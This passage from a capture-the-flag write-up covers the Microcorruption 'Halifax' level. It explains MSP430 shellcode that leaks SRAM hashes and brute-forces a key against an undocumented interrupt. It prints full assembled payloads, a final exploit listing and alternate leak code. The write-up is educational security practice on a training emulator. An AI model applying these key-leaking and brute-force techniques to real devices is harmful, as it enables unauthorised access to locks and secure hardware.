+│SP├─►│SP+0x0│0x41 (INTERRUPT NUMBERR)                   │
+└──┘  ├──────┼───────────────────────────────────────────┤
+      │SP+0x2│0x2 (OFFSET)                               │
+      ├──────┼───────────────────────────────────────────┤
+      │SP+0x4│0x2 (LENGTH)                               │
+      ├──────┼───────────────────────────────────────────┤
+      │SP+0x6│POINTER TO SHADOW BUFFER + CURRENT_OFFSET  │
+      ├──────┼───────────────────────────────────────────┤
+      │SP+0x8│POINTER TO SHADOW BUFFER + CURRENT_OFFSET  │
+      ├──────┼───────────────────────────────────────────┤
+      │SP+0xa│POINTER TO SHADOW BUFFER + CURRENT_OFFSET  │
+      ├──────┼───────────────────────────────────────────┤
+      │SP+0xc│POINTER TO SHADOW BUFFER + CURRENT_OFFSET  │
+      └──────┴───────────────────────────────────────────┘
+
+</code></pre>
+
+<p>It is unclear which stack offset should contain the pointer to the key, but it obviously cannot replace the offset or length because that would break the hashing logic. Valid dummy values (0x2) serve as surrogates for these two words. The four words after that are the pointer to the current offset in the shadow buffer. The call should succeed if interrupt <code>0x41</code> interprets one of those stack words as a key pointer.</p>
+
+<p>There must be some mechanism to verify whether the secure enclave accepted the key and unblocked the unlock interrupt, so it is tested by attempting to call the latter. The portable shellcode from Vancouver accomplishes this.</p> 
+
+<pre><code class='language-ascii-noshadows'>      ┌─────────┬─────────────────────┐
+      │3e40 00f0│mov  #0xf000, r14    │
+      ├─────────┼─────────────────────┤
+      │3f40 0090│mov  #0x9000, r15    │
+      ├─────────┼─────────────────────┤
+      │b012 6845│call #0x4568 &lt;getsn&gt; │
+      ├─────────┼─────────────────────┤
+      │3d40 0010│mov  #0x1000, r13    │
+      ├─────────┼─────────────────────┤
+      │3e40 0090│mov  #0x9000, r14    │
+      ├─────────┼─────────────────────┤
+      │3f40 00b0│mov  #0xb000, r15    │
+      ├─────────┼─────────────────────┤
+      │b012 a445│call #0x45a4 &lt;memcpy&gt;│
+      ├─────────┼─────────────────────┤
+      │1d42 0a80│mov  &amp;0x800a, r13    │
+      ├─────────┼─────────────────────┤
+      │1d53     │inc  r13             │
+      ├─────────┼─────────────────────┤
+      │824d 0a80│mov  r13, &amp;0x800a    │
+      ├─────────┼─────────────────────┤
+      │0d12     │push r13             │
+      ├─────────┼─────────────────────┤
+      │0d12     │push r13             │
+      ├─────────┼─────────────────────┤
+      │0d12     │push r13             │
+      ├─────────┼─────────────────────┤
+      │0d12     │push r13             │
+      ├─────────┼─────────────────────┤
+      │2312     │push #0x2            │
+      ├─────────┼─────────────────────┤
+      │2312     │push #0x2            │
+      ├─────────┼─────────────────────┤
+      │3012 4100│push #0x41           │
+      ├─────────┼─────────────────────┤
+      │b012 5045│call #0x4550 &lt;INT&gt;   │
+      ├─────────┼─────────────────────┤
+      │3150 0e00│add  #0xe, sp        │
+      ├─────────┼─────────────────────┤
+      │3240 00ff│<mark>mov  #0xff00, sr</mark>     │
+┌──┐  ├─────────┼─────────────────────┤
+│PC├─►│b012 1000│<mark>call #0x10</mark>           │
+└──┘  └─────────┴─────────────────────┘
+
+</code></pre>
+
+<p>The successful unlock status message should trigger if the current key candidate authenticates to the secure enclave.</p>
+
+<p>Lastly, if the unlock interrupt call does not succeed, the last defined word in the data section is compared to the current offset in the shadow buffer.
+
+The code deliberately jumps into null memory and crashes if it is equal, signaling that execution has ended without finding a valid key.
+</p>
+
+<pre><code class='language-ascii-noshadows'><xmp>
+       ┌─────────┬─────────────────────┐
+       │3e40 00f0│mov  #0xf000, r14    │
+       ├─────────┼─────────────────────┤
+       │3f40 0090│mov  #0x9000, r15    │
+       ├─────────┼─────────────────────┤
+       │b012 6845│call #0x4568 <getsn> │
+       ├─────────┼─────────────────────┤
+       │3d40 0010│mov  #0x1000, r13    │
+       ├─────────┼─────────────────────┤
+       │3e40 0090│mov  #0x9000, r14    │
+       ├─────────┼─────────────────────┤
+       │3f40 00b0│mov  #0xb000, r15    │
+       ├─────────┼─────────────────────┤
+       │b012 a445│call #0x45a4 <memcpy>│
+       ├─────────┼─────────────────────┤
+       │1d42 0a80│mov  &0x800a, r13    │
+       ├─────────┼─────────────────────┤
+       │1d53     │inc  r13             │
+       ├─────────┼─────────────────────┤
+       │824d 0a80│mov  r13, &0x800a    │
+       ├─────────┼─────────────────────┤       ┌──────┐
+       │0d12     │push r13             │       │      │
+       ├─────────┼─────────────────────┤       │ DATA │
+       │0d12     │push r13             │       │      │
+       ├─────────┼─────────────────────┤       ├──────┤
+       │0d12     │push r13             │       │ 3040 │
+       ├─────────┼─────────────────────┤       ├──────┤
+       │0d12     │push r13             │       │ 0080 │
+       ├─────────┼─────────────────────┤       ├──────┤
+       │2312     │push #0x2            │       │ FFFF │
+       ├─────────┼─────────────────────┤       ├──────┤
+       │2312     │push #0x2            │       │ 0003 │
+       ├─────────┼─────────────────────┤       ├──────┤      ┌────┐
+       │3012 4100│push #0x41           │       │ FFAF │      │R6: │
+       ├─────────┼─────────────────────┤       ├──────┤ LOAD¹├────┤
+       │b012 5045│call #0x4550 <INT>   │       │ 00b5 ├─────►│B500│
+       ├─────────┼─────────────────────┤       ├──────┤      └─┬──┘
+       │3150 0e00│add  #0xe, sp        │       │ .... │        │
+       ├─────────┼─────────────────────┤       ├──────┤        │
+       │3240 00ff│mov  #0xff00, sr     │       │ .... │        │
+       ├─────────┼─────────────────────┤       └──────┘        │
+       │b012 1000│call #0x10           │                       │
+┌───┐  ├─────────┼─────────────────────┤       ┌─────────────┐ │
+│PC¹├─►│1742 0c80│mov  &0x800c, r7     │       │   COMPARE²  │ │
+├───┤  ├─────────┼─────────────────────┤       ├─────────────┤ │
+│PC²├─►│0d97     │cmp  r7, r13         │       │             │ │
+├───┤  ├─────────┼─────────────────────┤       │ ┌───┐ ┌───┐ │ │
+│PC³├─►│0424     │jz   $+0xa           ├─────┐ │ │R7 │ │R13│ │◄┘
+└───┘  ├─────────┼─────────────────────┤     │ │ └───┘ └───┘ │
+       │3040 6880│br   #0x8068         │     │ │             │
+       └─────────┴─────────────────────┘     │ └─────────────┘
+                                             │
+                 ┌───────────┐               │
+                 │NULL MEMORY│◄──────────────┘
+                 └─────┬─────┘  JUMP IF EQUAL³
+                       │
+                       ▼
+                 ┌───────────┐
+                 │---CRASH---│
+                 └───────────┘
+</xmp></code></pre>
+
+This word is as follows:</p>
+
+<pre><code>3040 0080 ffff 0003
+ffaf <mark>00b5</mark> 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+</code></pre>
+
+<p>The SRAM data in the shadow buffer usually ranges from <code>0xB000</code> to <code>0xB140</code>, but this is not guaranteed. The payload code assumes the maximum length of SRAM data is 0x500. Execution branches back to the section that refreshes the shadow buffer if the address of the current offset is less than <code>0xB500</code> (0xB000 + 0x500).</p>
+
+<pre><code class='language-ascii-noshadows'>
+
+      ┌─────────┬─────────────────────┐
+      │3e40 00f0│mov  #0xf000, r14    │
+      ├─────────┼─────────────────────┤
+      │3f40 0090│mov  #0x9000, r15    │
+      ├─────────┼─────────────────────┤
+      │b012 6845│call #0x4568 &lt;getsn&gt; │
+      ├─────────┼─────────────────────┤
+      │3d40 0010│<mark>mov  #0x1000, r13</mark>    │◄───────┐
+      ├─────────┼─────────────────────┤        │
+      │3e40 0090│<mark>mov  #0x9000, r14</mark>    │        │
+      ├─────────┼─────────────────────┤        │
+      │3f40 00b0│<mark>mov  #0xb000, r15</mark>    │        │
+      ├─────────┼─────────────────────┤        │
+      │b012 a445│<mark>call #0x45a4 &lt;memcpy&gt;</mark>│        │
+      ├─────────┼─────────────────────┤        │
+      │1d42 0a80│mov  &amp;0x800a, r13    │        │
+      ├─────────┼─────────────────────┤        │
+      │1d53     │inc  r13             │        │
+      ├─────────┼─────────────────────┤        │
+      │824d 0a80│mov  r13, &amp;0x800a    │        │
+      ├─────────┼─────────────────────┤        │
+      │0d12     │push r13             │        │
+      ├─────────┼─────────────────────┤        │
+      │0d12     │push r13             │        │
+      ├─────────┼─────────────────────┤        │
+      │0d12     │push r13             │        │
+      ├─────────┼─────────────────────┤        │
+      │0d12     │push r13             │        │
+      ├─────────┼─────────────────────┤        │
+      │2312     │push #0x2            │        │
+      ├─────────┼─────────────────────┤        │
+      │2312     │push #0x2            │        │
+      ├─────────┼─────────────────────┤        │
+      │3012 4100│push #0x41           │        │
+      ├─────────┼─────────────────────┤        │
+      │b012 5045│call #0x4550 &lt;INT&gt;   │        │
+      ├─────────┼─────────────────────┤        │
+      │3150 0e00│add  #0xe, sp        │        │
+      ├─────────┼─────────────────────┤        │
+      │3240 00ff│mov  #0xff00, sr     │        │
+      ├─────────┼─────────────────────┤        │
+      │b012 1000│call #0x10           │        │
+      ├─────────┼─────────────────────┤        │
+      │1742 0c80│mov  &amp;0x800c, r7     │        │
+      ├─────────┼─────────────────────┤        │
+      │0d97     │cmp  r7, r13         │        │
+      ├─────────┼─────────────────────┤        │
+      │0424     │jz   $+0xa           │        │
+┌──┐  ├─────────┼─────────────────────┤ BRANCH │
+│PC├─►│3040 6880│<mark>br   #0x8068</mark>         ├────────┘
+└──┘  └─────────┴─────────────────────┘
+
+</code></pre>
+<p>The assembled payload is below.</p>
+
+<pre><code>8000 ff
+
+183c
+3040 0080 ffff 0003
+ffaf 00b5 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+
+3440 0280 a244 ee44 2453 a244 f044
+
+0d41
+3e40 0100
+1f42 0680
+1f53
+824f 0680
+1642 0880
+0f96
+0224
+3040 a644
+
+3e40 00f0 3f40 0090 b012 6845
+
+3d40 0010
+3e40 0090
+3f40 00b0
+b012 a445
+
+1d42 0a80
+1d53
+824d 0a80
+
+0d12
+0d12
+0d12
+0d12
+2312
+2312
+
+3012 4100
+b012 5045
+3150 0e00
+
+3240 00ff b012 1000
+
+1742 0c80
+0d97
+0424
+3040 6880
+</code></pre>
+
+      <h3>Results and Analysis</h3>
+      <p>Running this payload with either big or little endian SRAM data results in the following output:</p>
+      <pre><code><xmp>insn address unaligned
+CPUOFF flag set; program no longer running. CPU must now be reset.
+</xmp></code></pre>
+
+<p>This message indicates that payload execution completes without any key candidate unblocking the unlock interrupt. There are a few explanations for this:</p>
+<ol>
+	<li>Stripping an additional layer of encoding from the SRAM data is necessary.</li>
+
+	<ul>
+		<li>Unlikely. It might be reasonable to assume the presence of encoding<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">
+Many non-whitespace characters and multiple equal signs might indicate base64, for example.
+</span>
+
+if the extracted data had a consistent format, but the hexdump of the data does not seem to have any discernible pattern.</li>
+	</ul>
+	<li>The calling convention requires the key to be passed directly on the stack rather than as a pointer.</li>
+	<ul>
+		<li>Slightly more plausible, but (given that this system uses a 16-bit processor) a value that is eight words wide would be relatively large to be passed directly on the stack. Passing the literal value would make more sense with a small key value (i.e., 1 or 2 words). The payload code required to test this is more complicated to implement, so this possibility is discounted for now.</li>
+	</ul>
+	<li>The interrupt number is simply wrong.</li>
+	<ul>
+		<li>This scenario is absurd but possible.</li>
+	</ul>
+</ol>
+
+<h2>Here Be Dragons</h2>
+
+<p>The third option is worthy of consideration in the absence of saner alternatives. The correct interrupt number may not be <code>0x41</code>.</p>
+
+
+<h3>Strange Behavior</h3>
+<p>This theory is not as far-fetched as it might at first appear. Recall the calling convention for the 0x41 interrupt call. There are only a few stack locations to pass a key pointer.</p>
+
+<pre><code class='language-ascii-noshadows'>      ┌────────────────────────────────────────┐
+      │                 STACK                  │
+┌──┐  ├──────┬─────────────────────────────────┤
+│SP├─►│SP+0x0│0x41 (INTERRUPT NUMBERR)         │
+└──┘  ├──────┼─────────────────────────────────┤
+      │SP+0x2│OFFSET                           │
+      ├──────┼─────────────────────────────────┤
+      │SP+0x4│LENGTH                           │
+      ├──────┼─────────────────────────────────┤
+      │<mark>SP+0x6</mark>│POINTER TO CHECKSUM RETURN BUFFER├──┐
+      ├──────┼─────────────────────────────────┤  │
+      │SP+0x8│RETURN ADDRESS (MAIN)            │  │
+      ├──────┼─────────────────────────────────┤  │
+      │<mark>SP+0xa</mark>│CHECKSUM RETURN BUFFER + 0x0     │◄─┘
+      ├──────┼─────────────────────────────────┤
+      │<mark>SP+0xc</mark>│CHECKSUM RETURN BUFFER + 0x2     │
+      ├──────┼─────────────────────────────────┤
+      │<mark>SP+0xe</mark>│CHECKSUM RETURN BUFFER + 0x4     │
+      └──────┴─────────────────────────────────┘
+</code></pre>
+
+<p>It is implausible that the implementation would reference a pointer outside the current stack frame, which rules out the first three words of the checksum return buffer. While not impossible, this implementation choice would be so outlandish as to be outright broken.</p>
+
+<p>The only remaining option is the pointer to the checksum return buffer at <code>SP+0x6</code>, which could theoretically double as the pointer to the key. Recall that the interrupt call dereferences this pointer and overwrites the array with the SRAM hash.</p>
+
+<pre><code class='language-ascii-noshadows'>            ┌───────────────────────────────────────┐
+            │        CHECKSUM RETURN BUFFER         │
+     ┌───┐  ├───────────────────────────────────────┤
+     │KEY├─►│<mark>AAAA AAAA AAAA AAAA AAAA AAAA AAAA AAAA</mark>├─┐
+     └───┘  ├───────────────────────────────────────┤ │
+            │0000 0000 0000 0000 0000 0000 0000 0000│ │
+            └───────────────────────────────────────┘ │
+                                                      ▼
+                                            ┌────────────────────┐
+                                            │CALL sha256_internal│
+                                            └─────────┬──────────┘
+                                                      │
+            ┌───────────────────────────────────────┐ │
+            │        CHECKSUM RETURN BUFFER         │ │
+┌────────┐  ├───────────────────────────────────────┤ │
+│KEY     ├─►│<mark>XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX</mark>│◄┘
+│OVER    │  ├───────────────────────────────────────┤
+│WRITTEN │  │XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX│
+│BY      │  └───────────────────────────────────────┘
+│CHECKSUM│
+└────────┘
+</code></pre>
+
+<p>Combining two disparate pieces of functionality (hashing SRAM and passing the key) into a single interrupt call is odd. The returned SRAM hash would clobber the key. The side effect is, for lack of a better word, inelegant. It would be cleaner to separate these two pieces of functionality into different interrupt calls.</p>
+
+<h2>Psychological Warfare</h2>
+
+<p>Recall the description from the "manual" command:</p>
+
+<blockquote>
+	Any payload is allowed, because the unlock key must be passed to the new interrupt with code <mark>0x41</mark>, and this key is only stored in secure memory.
+</blockquote>
+
+<p>The I/O console prints the following output on each run:</p>
+
+<pre><code>0x7f interrupt disabled, key stored in internal SRAM
+unlock by providing the 16 byte key to <mark>0x41</mark> interrupt
+</code></pre>
+
+<p>A developer making the same typo in two places is improbable, which implies that if the interrupt number is inaccurate, it is most likely deliberate and meant to hinder reverse engineering efforts. The information conveyed in the manual and status messages may be an instance of psychological warfare.</p>
+
+<h3>Interrupt Number Groupings</h3>
+
+<p>Extending the shellcode to automatically bruteforce the interrupt number is possible, but it is quicker to increment it by hand after narrowing the probable range. The <a href="https://microcorruption.com/public/manual.pdf">manual PDF</a> does not document the new interrupts, but the old ones seem to be grouped by the leading nibble of the interrupt number.</p>
+
+<br>
+      <table>
+        <caption>Interrupt Number Groupings</caption>
+        <thead>
+          <tr>
+            <th>Type</th>
+            <th>Number</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+		  <td>I/O</td>
+		  <td>0x00</td>
+          </tr>
+          <tr>
+		  <td>I/O</td>
+		  <td>0x01</td>
+          </tr>
+          <tr>
+		  <td>I/O</td>
+		  <td>0x02</td>
+          </tr>
+          <tr>
+		  <td>DEP</td>
+		  <td>0x10</td>
+          </tr>
+          <tr>
+		  <td>DEP</td>
+		  <td>0x11</td>
+          </tr>
+          <tr>
+		  <td>HSM</td>
+		  <td>0x7D</td>
+          </tr>
+          <tr>
+		  <td>HSM/Unlock</td>
+		  <td>0x7E</td>
+          </tr>
+          <tr>
+		  <td>Unlock</td>
+		  <td>0x7F</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <p>This scheme suggests that all interrupts used for interfacing with the secure element fall into the <code>0x40-0x4F</code> range.</p>
+
+<h3>Payload Modifications</h3>
+<h4>Attempt 1</h4>
+<p>Regardless of how likely this scenario is, testing the hypothesis requires minimal changes to the payload.</p>
+
+<p>The likely place to start is with the other known interrupt in the <code>0x40-0x4F</code> range: <code>0x40</code>. The firmware pushes two placeholder null words before the interrupt number. Either one of these might be a pointer to the key.</p>
+
+
+      <pre><code>444a:  mov	#0x4658 "Enabling hardened mode", r15
+444e:  call	#0x4586 &lt;puts&gt;
+4452:  push	<mark>#0x0</mark>
+4454:  push	<mark>#0x0</mark>
+4456:  push	#0x40
+445a:  call	#0x4550 &lt;INT&gt;
+</code></pre>
+
+<p>The section of the payload to be modified is as follows.</p>
+
+<h5>Original payload:</h5>
+<pre><code>0d12           push	r13
+0d12           push	r13
+0d12           push	r13
+0d12           push	r13
+<mark>2312           push	#0x2
+2312           push	#0x2
+3012 4100      push	#0x41</mark>
+b012 5045      call	#0x4550
+3150 0e00      add	#0xe, sp
+</code></pre>
+
+<p>The interrupt number should be decremented by one. The dummy values (0x2) can be replaced with the value of <code>R13</code>, as it is now unnecessary to adhere to the calling convention for the <code>0x41</code> interrupt.</p>
+
+<h5>Modified payload:</h5>
+<pre><code>0d12           push	r13
+0d12           push	r13
+0d12           push	r13
+0d12           push	r13
+<mark>0d12           push	r13
+0d12           push	r13
+3012 4000      push	#0x40</mark>
+b012 5045      call	#0x4550
+3150 0e00      add	#0xe, sp
+</code></pre>
+
+<p>Assembling and running the modified payload results in the following output at the debug console:</p>
+
+      <pre><code><xmp>insn address unaligned
+CPUOFF flag set; program no longer running. CPU must now be reset.
+</xmp></code></pre>
+
+<p>This crash indicates that the loop ended without sending a valid key to the correct interrupt.</p>
+
+<h4>Attempt 2</h4>
+<p>The known interrupts have been exhausted. As observed previously, interrupts tend to be grouped by function. The next logical step is to try the entire 0x40-0x4F range—starting with 0x42.</p>
+
+<h5>Modified payload:</h5>
+<pre><code>0d12           push	r13
+0d12           push	r13
+0d12           push	r13
+0d12           push	r13
+0d12           push	r13
+0d12           push	r13
+3012 4000      push	<mark>#0x42</mark>
+b012 5045      call	#0x4550
+3150 0e00      add	#0xe, sp
+</code></pre>
+
+<h2>Authentication Bypass</h2>
+
+<p>Running the above payload and submitting the leaked SRAM data in big-endian format causes the unlock interrupt to trigger successfully.</p>
+
+<pre></code>Door Unlocked
+The CPU completed in 4893366 cycles.</code></pre>
+<h3>Final Exploit</h3>
+<pre><code>8000 ff
+
+183c
+3040 0080 ffff 0003
+ffaf 00b5 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+
+3440 0280 a244 ee44 2453 a244 f044
+
+0d41
+3e40 0100
+1f42 0680
+1f53
+824f 0680
+1642 0880
+0f96
+0224
+3040 a644
+
+3e40 00f0 3f40 0090 b012 6845
+
+3d40 0010
+3e40 0090
+3f40 00b0
+b012 a445
+
+1d42 0a80
+1d53
+824d 0a80
+
+0d12
+0d12
+0d12
+0d12
+0d12
+0d12
+
+3012 4200
+b012 5045
+3150 0e00
+
+0312 0312 3012 7f00 b012 5045
+3150 0600
+
+1742 0c80
+0d97
+0424
+3040 6880
+</code></pre>
+
+
+<h2>Conclusion</h2>
+<h3>Bug Reporting</h3>
+
+<p>After completing this challenge, it was worth reaching out to the creators and inquiring (as part of a report about multiple unrelated<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">The new backend brought with it numerous <s>bugs</s> features. Those who thought the original set was too easy will praise the introduction of <em>hard mode</em>—in the form of the <em>new and improved</em> (dis)assembler.</span>
+
+bugs) whether the erroneous interrupt number in the manual and status messages was a deliberate attempt at psychological warfare.</p>
+
+<blockquote>
+The nature of the typo makes a subtle psychological difference: one reference might be mistaken, but multiple sources saying the same thing isn't an accident. [...] If the goal is to make it look like a mistake, only reference it in one place or not at all. If the goal is to make it look malicious, a third option is to add some window dressing to the level manual about how LockItAll hired a "psychological warfare specialist" to make their device unhackable.
+<br>
+<cite>— Email to challenge creators, November 1st, 2022</cite>
+</blockquote>
+
+<h3>Competitive Sabotage</h3>
+<p>The same email included advice not to fix the typo if it was one.</p>
+
+<blockquote>
+If I had to suffer then everyone else should too :)
+<br><cite>— Email to challenge creators, November 1st, 2022</cite>
+</blockquote>
+
+<p>Antics aside, there was an actual reason for this.</p>
+
+<blockquote>
+I liked the black box analysis angle. [...] [M]ake people infer that something in the 0x40-0x4f range must be the undocumented interrupt based on comparing it to the other known interrupt values. [...]
+
+I think it reinforces a useful philosophical mindset: don't trust the device developers too much, because if they knew what they were doing then the device wouldn't have vulnerabilities to begin with. Quite a few of the original 19 levels lied in the level manual or in the program output (about max password lengths or how the HSM-2 worked, for example). I think a deliberate typo or lie about actual interrupt numbers is a nice progression.
+<br><cite>— Email to challenge creators, November 1st, 2022</cite>
+</blockquote>
+
+<p>It remains unclear whether the creators took this advice. The only response was as follows.</p>
+
+<blockquote>
+Apologies for the delay, you hit us up at an awkward time. And thank you for your well thought out description.  We're looking into it.
+<br><cite>— Response email, November 17th, 2022</cite>
+</blockquote>
+
+<h3>Alternate Approaches</h3>
+
+<p>There are two alternate solutions written several months after the one described herein. These exploits bear review, as both differ substantially from the one presented here (albeit for very different reasons).</p>
+
+<h4>Writeup by John Breaux</h4>
+
+<p><a href="https://www.linkedin.com/in/john-alan-breaux">John Breaux</a> published a <a href="https://www.linkedin.com/posts/john-alan-breaux_micro-corruption-halifax-activity-7082150804056391680-sCKB">writeup</a> several months ago documenting a similar solution.</p>
+
+<h5>Alternate Leak Code</h5>
+<p>The main point of difference in this case was the decision to leak only the first few bytes of each hash.</p> 
+
+<blockquote>
+	There should be a way to uniquely identify a single byte using the first <code>n</code> bytes of output. We can find <code>n</code> by computing the hashes of the numbers 00-ff, and counting how many unique sequences there are when truncating those hashes to a certain length. [...] The start of my payload, which defines some constants, then saves 3 bytes of the hash of each byte in the internal SRAM, for later printing.
+<cite>— John Breaux</cite>
+</blockquote>
+
+<p>This trick makes it possible to represent the underlying SRAM data in fewer bytes, resulting in more compact information leak output. The following code accomplishes this.</p>
+
+<pre><code><xmp>get_sram_hashes:
+clr   r11            ; loop variable in r11
+mov   #msize, r14    ; r14 = 1
+mov   #haddr, r13    ; set destination to 0x8000
+sr_loop:
+mov   r11, r15       ; mov addr r15
+call  sha256_internal; <sha256_internal>
+add   #hsize, r13    ; keep 3 bytes of the output
+inc   r11            ; inc r11
+cmp   #sr_len, r11        ; do that 0x1000 times
+jnc   sr_loop
+
+print_hex:
+clr   r11;
+ph_loop:
+mov.b haddr(r11), r14
+mov.b r14, r15
+rra   r15            ; using rra here instead of rra.b means the value won't roll into the highest bit
+rra   r15            ; which negates the need to and 0xf, r15
+rra   r15
+rra   r15
+clrc
+and   #0xf, r14
+mov.b HEX_LUT(r15), r15
+call  putchar        ; <putchar>
+mov.b HEX_LUT(r14), r15
+call  putchar        ; <putchar>
+inc   r11            ; inc r11
+cmp   #ha_len, r11        ; do that sram_length*3 times
+jnc   ph_loop
+
+mov.b #0xa, r15      ; '\n'
+call  #0x4578        ; putchar ('\n')
+</xmp></code></pre>
+
+<p>It is probably simpler to reuse the existing code in <code>main</code> for printing leaked hashes, but this approach is relatively novel and faster in terms of execution speed.</p>
+
+
+<h5>Inferior Automation</h5>
+
+<p>The partial hash leakage approach ultimately became a liability, as it complicated the implementation and made it harder to spot subtle bugs.</p>
+
+<blockquote>
+I discovered a string formatting error in my python script that caused it to print /[0-9]/ when it meant /0[0-9]/
+<cite>— John Breaux</cite>
+</blockquote>
+
+<p>This error corrupted input for the SRAM rainbow table lookup process and prevented Breaux from identifying interrupt 0x42 as the correct one (even though the payload code otherwise should have). The failure was a byproduct of the choice to leak only the first three bytes of each hash, as such a scheme required more convoluted Python code to massage the output back into the correct representation of the source data.</p>
+
+<blockquote>
+We exhausted our supply of ideas, and eventually concluded that the challenge must be broken. [...] Over the course of the next 6 months, the three of us worked collaboratively to figure out what went wrong. 
+<br><cite>— John Breaux</cite>
+</blockquote>
+
+
+<h5>Not-So-Psychological-Warfare</h5>
+
+<p>Ultimately, someone else informed Breaux that the interrupt number was wrong.</p>
+
+<blockquote>
+Nothing was working, and it didn't seem to even attempt to use our keys. So, we contacted the challenge authors. No response. [...] But, eventually, a member of the ReSwitched Discord who happens to have access to the project informed us that there was a typo in both the directions and the program itself.
+<cite>— John Breaux</cite>
+</blockquote>
+
+<p>This information seemingly<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">
+If any of the challenge authors are reading this page, confirmation would be appreciated.
+</span>
+
+confirms that the erroneous interrupt number was a simple typographic issue rather than a deliberately malicious red herring.</p>
+
+<p>Aside from the custom leak code, Breaux's approach is more or less identical to the one described herein. While it eventually succeeded, it seems to have been a time-consuming process that required aid from at least three other people.</p>
+
+
+<h5>Timing Analysis</h5>
+<blockquote>
+It doesn't [...] take more than one cycle to execute. [...] Most other interrupts, if I remember right, cost something to run—are implemented somewhere within the MSP430 emulator's firmware. Yet this one isn't. It's just bizarre.
+<br><cite>— John Breaux</cite>
+</blockquote>
+
+
+<p>While not directly relevant to the solution, Breaux uses an unorthodox technique to narrow down candidate interrupt numbers. There is a built-in debugger command that prints the current cycle count. Most interrupt calls take a few cycles to execute. By this logic, any interrupt number that takes multiple cycles must be doing something on the backend.</p>
+
+<p>Unfortunately, interrupt 0x42 seems to break this assumption.</p>
+
+
+<h4>Read Address Overflow Technique — Developed by Anonymous Author</h4>
+<p>The second alternate approach developed several months after the one described herein does not have a public writeup—but it utilizes a creative technique to identify the correct interrupt number.</p>
+
+<h5>Interrupt Side Effects</h5>
+<blockquote>
+When I was poking around with alternate interrupt numbers, I did check if interrupt 0x42 did anything... But it didn't seem to. There are no side effects to calling INT 0x42.
+<br><cite>— John Breaux</cite>
+</blockquote>
+
+<p>While a reasonable conclusion, this is not strictly true. A side effect in interrupt 0x42 is introducible via specifically chosen values passed on the stack.</p>
+
+<p>After ruling out interrupt 0x41, testing subsequent interrupt numbers uses the following stack layout.</p>
+
+
+<pre><code class='language-ascii-noshadows'>      ┌────────────────────────────────────────┐
+      │                 STACK                  │
+┌──┐  ├──────┬─────────────────────────────────┤
+│SP├─►│SP+0x0│0x40-0x4F (INTERRUPT NUMBERR)    │
+└──┘  ├──────┼─────────────────────────────────┤
+      │SP+0x2│KEY POINTER                      │
+      ├──────┼─────────────────────────────────┤
+      │SP+0x4│KEY POINTER                      │
+      ├──────┼─────────────────────────────────┤
+      │SP+0x6│KEY POINTER                      ├──┐
+      ├──────┼─────────────────────────────────┤  │
+      │SP+0x8│KEY POINTER                      │  │
+      ├──────┼─────────────────────────────────┤  │
+      │SP+0xa│KEY POINTER                      │◄─┘
+      ├──────┼─────────────────────────────────┤
+      │SP+0xc│KEY POINTER                      │
+      └──────┴─────────────────────────────────┘
+</code></pre>
+
+<p>The methodology applied herein cannot determine whether an interrupt call does anything, so it attempts to anticipate every possible combination and brute force them until the unlock is triggered. This strategy works well if the payload code is meticulous, but it would be preferable to determine whether any given call is dereferencing the key pointer.</p>
+
+<p>It is possible to detect this on other architectures by providing a pointer to unmapped memory (e.g., a null pointer), that will cause a segmentation fault when dereferenced. Inconveniently, the entire memory space is writable by default on this ISA—dereferencing a null pointer will not cause a crash. A different (anonymous) individual found a way to overcome this limitation.</p>
+
+
+<pre><code class='language-ascii-noshadows'>      ┌────────────────────────────────────────┐
+      │                 STACK                  │
+┌──┐  ├──────┬─────────────────────────────────┤
+│SP├─►│SP+0x0│0x40-0x4F (INTERRUPT NUMBERR)    │
+└──┘  ├──────┼─────────────────────────────────┤
+      │SP+0x2│0xFFFF                           │
+      ├──────┼─────────────────────────────────┤
+      │SP+0x4│0xFFFF                           │
+      ├──────┼─────────────────────────────────┤
+      │SP+0x6│0xFFFF                           ├──┐
+      ├──────┼─────────────────────────────────┤  │
+      │SP+0x8│0xFFFF                           │  │
+      ├──────┼─────────────────────────────────┤  │
+      │SP+0xa│0xFFFF                           │◄─┘
+      ├──────┼─────────────────────────────────┤
+      │SP+0xc│0xFFFF                           │
+      └──────┴─────────────────────────────────┘
+</code></pre>
+
+<p>Any attempt to interpret these dummy values as pointers will fail with the following error.</p>
+
+<pre><code>read address would wrap
+CPUOFF flag set; program no longer running. CPU must now be reset.
+</code></pre>
+
+<p>This error occurs because attempting to read a word or multiple bytes starting from that address would cause an integer overflow and a wraparound to address 0x0000, which crashes the processor.</p>
+
+<p>Out of all interrupts in the 0x40-0x4F range, this only occurs when calling interrupt 0x42. This pattern suggests that only interrupt 0x42 dereferences one of the pointers. The creator of this technique used it to narrow down which interrupts were attempting to read from MCU memory, which allowed for messier payload code—without concern for subtle breakage.</p>
+
+<p>This technique acts as a sanity check. Aside from that, the rest of the exploit is more or less identical.</p>
+
+<h4>Takeaways</h4>
+<blockquote>
+<b>Anonymous Author:</b> I am in hell.
+<br>
+<b>Yours Truly:</b> Halifax is in Canada. Technically speaking, it is the exact meteorological opposite of hell.
+</blockquote>
+
+<p>The exploit by John Breaux is a case study of how tricky it can be to attack an implementation like this. The black box analysis process is fraught with subtle perils, and debugging is often maddening. The read address overflow technique is a beautiful example of how to shine more light into the inscrutable abyss.</p>
+
+<p>The exploit described herein relies heavily on robust automation—with as few moving parts as possible—to counteract subtle mistakes. It achieves through conscientiousness what the read address overflow technique achieves through creativity.</p>
+
+<h2>Remediation</h2>
